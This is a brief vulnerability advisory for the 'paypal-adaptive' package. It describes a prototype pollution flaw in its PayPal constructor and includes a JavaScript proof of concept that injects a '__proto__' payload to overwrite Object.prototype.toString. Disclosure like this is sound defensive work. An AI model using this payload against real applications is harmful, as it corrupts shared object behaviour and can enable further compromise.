# Overview

Affected versions of this package are vulnerable to Prototype Pollution. The `PayPal` function could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.

# POC

```js
var PayPal = require('paypal-adaptive');
var p = new PayPal({"__proto__": {"toString": "JHU"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"}) console.log(({}).toString);
```
